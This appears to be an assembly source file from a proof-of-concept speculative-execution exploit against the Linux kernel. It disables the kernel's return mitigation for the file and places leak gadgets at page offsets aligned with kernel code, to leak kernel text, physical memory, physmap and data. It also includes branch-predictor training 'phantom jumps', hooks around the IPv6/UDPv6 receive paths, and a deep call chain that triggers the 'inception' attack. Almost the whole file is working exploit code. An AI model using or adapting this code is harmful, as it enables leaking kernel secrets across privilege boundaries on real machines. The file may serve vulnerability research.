#include <asm/page_types.h>
#include <asm/linkage.h>

.intel_syntax noprefix

# this temporarily disables saferet for this file
#undef RET
#define RET ret

.align 0x1000
.rept 0x720
nop
.endr

.globl gadget_leak_text
gadget_leak_text:
mov rax ,QWORD PTR [rbx+0x58]
mov r13 ,QWORD PTR [rax+0x8]
mov rax ,QWORD PTR [rbx+0x18]
mov r12d,DWORD PTR [rax+0x20]
mov rax ,QWORD PTR [rbx+0x30]
shr r12d,0x8
and r12d,0xff00
mov rsi,QWORD PTR [rax+0x10]
RET

.align 0x1000
.rept 0x3fa
nop
.endr

mov rdx,0xffffffffffffffff
or rax, 0x22080
// add rax, 0xffffffff8291c848
.globl gadget_leak_phys
gadget_leak_phys:
add rax, __PAGE_OFFSET
mov QWORD PTR [rax],rdx
RET

.align 0x1000
.rept 0x1dbe # add an extra page to allow mappings not to overlap
nop
.endr

.byte 0x74
.byte 0x1d
sub eax,0x1
mov DWORD PTR [rbx+0x18],eax
.globl gadget_leak_phys2
gadget_leak_phys2:
mov rax,QWORD PTR [rbx+rax*8+0x20]
mov rbx,QWORD PTR [rbp-0x8]
RET
leave
xor edx,edx
mov ecx,edx
mov esi,edx
mov edi,edx
RET

.align 0x1000
.rept 0x13fa
nop
.endr

mov rdx,0xffffffffffffffff
or rax, 0x22080
// add rax, 0xffffffff8291c848
.globl gadget_leak_phys_total
gadget_leak_phys_total:
mov rax,QWORD PTR [rbx+0x20]
add rax, __PAGE_OFFSET
mov QWORD PTR [rax],rdx

.align 0x1000
.rept 0xf01
nop
.endr

.globl gadget_leak_physmap
gadget_leak_physmap:
mov rax,QWORD PTR [rbx+0x48]
mov rdi,QWORD PTR [rax+0xc0]
RET

.align 0x1000
.rept 0xd3b
nop
.endr

mov eax,DWORD PTR [rbx+0x9c]
cmp eax,0x105
.byte 0x0f
.byte 0x87
.byte 0xc3
.byte 0xfd
.byte 0xff
.byte 0xff
mov edx,DWORD PTR [rbp-0x34]
test edx,edx
.byte 0x74
.byte 0x8b
test eax,eax
.byte 0x0f
.byte 0x84
.byte 0x83
.byte 0x00
.byte 0x00
.byte 0x00
cmp eax,0x2
.byte 0x0f
.byte 0x86
.byte 0xfe
.byte 0xfd
.byte 0xff
.byte 0xff
.byte 0xe9
.byte 0xa6
.byte 0xfd
.byte 0xff
.byte 0xff
sub eax,0x1
mov DWORD PTR [rbx+0x88],eax
.byte 0xeb
.byte 0x4a
.globl gadget_leak_data
gadget_leak_data:
mov rsi,QWORD PTR [rbx+0x48]
lea eax,[rdx+0x2]
shl r14d,cl
mov rcx,QWORD PTR [rbx+0x60]
and edx,DWORD PTR [rbx+0x40]
movzx eax,BYTE PTR [rsi+rax*1]
xor eax,r14d
and eax,DWORD PTR [rbx+0x74]
mov DWORD PTR [rbx+0x68],eax
movzx r14d,WORD PTR [rcx+rax*2]
RET

.align 0x1000
.rept 0xd3b
nop
.endr

mov eax,DWORD PTR [rbx+0x9c]
cmp eax,0x105
.byte 0x0f
.byte 0x87
.byte 0xc3
.byte 0xfd
.byte 0xff
.byte 0xff
mov edx,DWORD PTR [rbp-0x34]
test edx,edx
.byte 0x74
.byte 0x8b
test eax,eax
.byte 0x0f
.byte 0x84
.byte 0x83
.byte 0x00
.byte 0x00
.byte 0x00
cmp eax,0x2
.byte 0x0f
.byte 0x86
.byte 0xfe
.byte 0xfd
.byte 0xff
.byte 0xff
.byte 0xe9
.byte 0xa6
.byte 0xfd
.byte 0xff
.byte 0xff
sub eax,0x1
mov DWORD PTR [rbx+0x88],eax
.byte 0xeb
.byte 0x4a
.globl gadget_leak_data_selftest
gadget_leak_data_selftest:
mov rax, [rbx]
mov rax, [rbx]
mov rax, [rbx]
mov rax, [rbx]
RET

bogus_func:
RET

.align 0x1000
.rept 0x15b9
nop
.endr

.globl phantom_jump1
phantom_jump1:
# call bogus_func
nop
nop
nop
nop
nop
test eax,eax # index BTB upon return from call
jle jmp_target
.rept 0x123
nop
.endr
jmp_target:
mov rax,QWORD PTR [rbp-0x30]
RET

.align 0x1000
# .rept 0x5b9
.rept 0x5f9
nop
.endr

.globl phantom_jump2_backup
phantom_jump2_backup:
# call bogus_func
nop
nop
nop
nop
nop
test eax,eax # index BTB upon return from call
jle jmp_target2
.rept 0x123
nop
.endr
jmp_target2:
mov rax,QWORD PTR [rbp-0x30]
RET

.align 0x1000
.rept 0xba7
nop
.endr

.globl phantom_jump2
phantom_jump2:
# call bogus_func
mov eax, r13d
xor eax, eax
# nop
# nop
# nop
# nop
test eax,eax # index BTB upon return from call
jne jmp_target3
push rbx
pop  rbx
mov eax, r13d
push rdx
push r12
push rax
push rbp
nop
pop rbp
pop rax
pop r12
xor edx, edx
pop rdx
jmp_target3:
RET

.globl ip6_protocol_deliver_rcu_new
ip6_protocol_deliver_rcu_new:
mov rax, ip6_protocol_deliver_rcu_module_addr
call rax
jmp phantom_jump1
RET

.globl udpv6_queue_rcv_one_skb_new
udpv6_queue_rcv_one_skb_new:
mov rax, udpv6_queue_rcv_one_skb_module_addr
call rax
push rax
xor rax, rax
call phantom_jump2
pop rax
RET

.align 0x1000
.rept 0x1000
nop
.endr

// create deep enough call stack where our addr we control (reload buffer) is moved into rbx
.globl trigger_inception
trigger_inception:
push rbx
push rcx
push r14
mov rbx, rdi
mov rcx, 0x0
mov r14, 0x0
call in01
pop r14
pop rcx
pop rbx
RET
in01:
call in02
RET
in02:
call in03
RET
in03:
call in04
RET
in04:
call in05
RET
in05:
call in06
RET
in06:
call in07
RET
in07:
call in08
RET
in08:
call in09
RET
in09:
call in10
RET
in10:
call in11
RET
in11:
call in12
RET
in12:
call in13
RET
in13:
call in14
RET
in14:
call in15
RET
in15:
call in16
RET
in16:
call in17
RET
in17:
call in18
RET
in18:
call in19
RET
in19:
call in20
RET
in20:
call in21
RET
in21:
call in22
RET
in22:
call in23
RET
in23:
call in24
RET
in24:
call in25
RET
in25:
call in26
RET
in26:
call in27
RET
in27:
call in28
RET
in28:
call in29
RET
in29:
call in30
RET
in30:
call in31
RET
in31:
call in32
RET
in32:
call in33
RET
in33:
xor rax, rax
call phantom_jump1
xor rax, rax
RET
